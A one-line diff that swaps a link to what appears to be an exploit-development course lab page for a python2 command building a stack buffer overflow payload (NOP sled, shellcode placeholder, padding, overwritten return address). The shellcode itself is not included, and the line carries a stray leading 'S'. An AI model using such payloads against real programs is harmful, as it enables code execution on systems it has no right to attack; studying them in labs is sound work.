@@ -1,1 +1,1 @@
-https://samsclass.info/127/proj/ED205c.htm
+Spython2 -c "print '\x90'*52 + shellcode + 'B'*12 + 'C'*4 + '\xf0\x12\xf8\xff'"
